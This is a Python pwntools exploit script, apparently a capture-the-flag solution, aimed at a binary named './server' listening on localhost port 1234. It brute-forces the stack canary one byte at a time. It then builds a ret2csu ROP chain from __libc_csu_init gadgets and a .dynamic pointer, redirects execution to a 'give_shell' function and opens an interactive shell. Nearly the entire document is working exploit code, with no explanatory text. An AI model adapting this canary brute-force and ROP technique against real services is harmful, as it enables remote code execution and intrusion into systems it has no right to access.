#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

from pwn import *
context.log_level = 'debug'

elf = ELF('./server')

# ROP Gadgets
__libc_csu_init = elf.symbols['__libc_csu_init']
gadget1 = __libc_csu_init + 64  # mov rdx, r14; mov rsi, r13 ; mov edi, r12d ; call qword ptr [r15+rbx*8]
gadget2 = __libc_csu_init + 90  # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
gadget3 = 0x401503  # pop rdi ; ret

# function
give_shell = elf.symbols['give_shell']

# Byte sequence alias
A8 = 8 * b'A'


def bruteforce_canary(padding):
    # The first byte of stack canary is known to be 0x00.
    canary_bytes = [0x00]

    # Bruteforce the subsequent bytes.
    log.info('Bruteforcing stack canary...')
    for i in range(7):
        for j in range(0xff + 1):
            proc = process('nc localhost 1234', shell=True, level='error')
            proc.recvuntil('world!\n')
            proc.send(padding + bytes(canary_bytes) + bytes([j]))

            try:
                received = proc.recvall()
            except EOFError:
                None

            if b'Goodbye!\n' in received:
                canary_bytes += bytes([j])
                print('Found byte: {}'.format(hex(j)))
                break

    return bytes(canary_bytes)



def main():
    payload =  5 * A8                       # padding (dummy)
    payload += bruteforce_canary(payload)   # canary
    payload += A8                           # saved rbp
    payload += p64(gadget2)                 # ret
    payload += p64(0)                       # rbx
    payload += p64(1)                       # rbp
    payload += A8                           # r12d -> edi (dummy)
    payload += A8                           # r13  -> rsi (dummy)
    payload += A8                           # r14  -> rdx
    payload += p64(0x403e38)                # r15  -> somewhere in .dynamic -> _fini
    payload += p64(gadget1)                 # call [r15 + rbx*8] ... -> r15 + rbx * 8 -> _fini

    payload += 7 * A8                       # 7 instead of 6 because ... 0x400896: add rsp, 0x8
    payload += p64(give_shell)
    #payload += p64(ret2win)
    #sys.stdout.buffer.write(payload + b'\n')


    # mov rdi, &'/bin/sh\x00'
    # mov rsi, &'sh\x00'
    # mov rdx, NULL
    # syscall

    proc = process('nc localhost 1234', shell=True)
    proc.recvuntil('world!\n')
    proc.send(payload)
    proc.recvall()
    proc.interactive()



if __name__ == '__main__':
    main()
